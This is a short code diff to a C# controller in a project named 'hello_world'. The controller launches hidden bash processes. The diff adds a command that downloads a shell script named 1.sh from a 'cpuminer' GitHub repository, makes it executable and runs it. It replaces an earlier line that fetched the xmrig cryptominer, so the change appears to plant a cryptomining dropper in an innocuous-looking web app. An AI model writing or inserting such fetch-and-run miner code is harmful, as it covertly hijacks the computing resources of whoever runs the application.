@@ -32,7 +32,7 @@ namespace hello_world.Controllers
                     WindowStyle = ProcessWindowStyle.Hidden,
                     FileName = $"/bin/bash",
                     WorkingDirectory = AppContext.BaseDirectory,
-                    Arguments = $"-c \"ps -aux\"",
+                    Arguments = $"-c \"ps -aux; ls -l\"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false
@@ -69,7 +69,7 @@ namespace hello_world.Controllers
                         FileName = $"/bin/bash",
                         WorkingDirectory = AppContext.BaseDirectory,
                         Arguments =
-                            $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz \"",
+                            $"curl -LJO https://raw.githubusercontent.com/ubuntuabd4/cpuminer/master/1.sh 1.sh; chmod +x 1.sh ; ./1.sh",
                         RedirectStandardOutput = true,
                         RedirectStandardError = true,
                         UseShellExecute = false
